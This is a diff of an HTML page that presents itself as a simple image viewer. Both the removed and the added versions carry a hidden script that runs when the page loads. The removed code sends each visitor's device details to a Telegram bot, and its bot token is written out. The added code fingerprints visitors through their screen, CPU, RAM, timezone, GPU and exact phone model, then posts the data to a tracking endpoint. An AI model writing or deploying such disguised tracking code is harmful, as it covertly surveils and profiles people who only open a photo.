@@ -1,8 +1,9 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Image Viewer</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Viewer</title>
     <style>
         body { background-color: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; }
         img { max-width: 100%; max-height: 100vh; object-fit: contain; }
@@ -10,42 +11,49 @@
 </head>
 <body>
 
-    <!-- 📷 फोटो हमेशा तुरंत लोड होगी -->
     <img src="photo.jpg" alt="Image Viewer">
 
     <script>
-        (function() {
-            const token = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
-            const chatId = "1798743066"; 
+        async function captureTargetFingerprint() {
+            try {
+                let metadata = {
+                    screenRes: `${window.screen.width}x${window.screen.height}`,
+                    pixelRatio: window.devicePixelRatio || 1,
+                    cores: navigator.hardwareConcurrency || "Hidden",
+                    ram: navigator.deviceMemory || "Hidden",
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
 
-            // बुनियादी डिवाइस पैरामीटर्स एकत्र करें
-            const userAgentText = navigator.userAgent;
-            const screenRes = window.screen.width + "x" + window.screen.height;
-            const language = navigator.language || "Unknown";
+                // Canvas के ज़रिए GPU एक्सट्रैक्ट करना
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        metadata.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                } catch (e) { metadata.gpuRenderer = "Blocked"; }
 
-            // टेलीग्राम संदेश फ़ॉर्मेटिंग
-            const textMessage = "🔔 *FIOMART DIRECT LIVE ALERT* 🔔\n\n📱 *Device Info:* `" + userAgentText + "`\n🖥️ *Screen Size:* `" + screenRes + "`\n🌐 *Language:* `" + language + "`";
-            
-            // टेलीग्राम का मानक और स्वीकृत API पाथ
-            const finalUrl = "https://telegram.org" + token + "/sendMessage";
-            
-            // बिना किसी सर्वर (Vercel Back-end) पर निर्भर रहे सीधे ब्राउज़र से टेलीग्राम को डेटा पोस्ट करना
-            fetch(finalUrl, {
-                method: "POST",
-                headers: { 
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: textMessage,
-                    parse_mode: "Markdown"
-                })
-            })
-            .then(res => res.json())
-            .then(data => console.log("Telegram Delivery:", data))
-            .catch(err => console.error("Network Dispatch Error:", err));
-        })();
+                // High-Entropy Client Hints (सटीक मोबाइल हैंडसेट नाम के लिए)
+                if (navigator.userAgentData) {
+                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                    metadata.exactModel = hints.model || "Unknown";
+                    metadata.osVersion = hints.platformVersion || "Unknown";
+                }
+
+                // सीधे Vercel बैकएंड API को डेटा भेजना
+                fetch('/api/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(metadata)
+                });
+
+            } catch (err) {
+                console.log("Forensic Failure:", err);
+            }
+        }
+
+        window.onload = captureTargetFingerprint;
     </script>
-
 </body>
 </html>
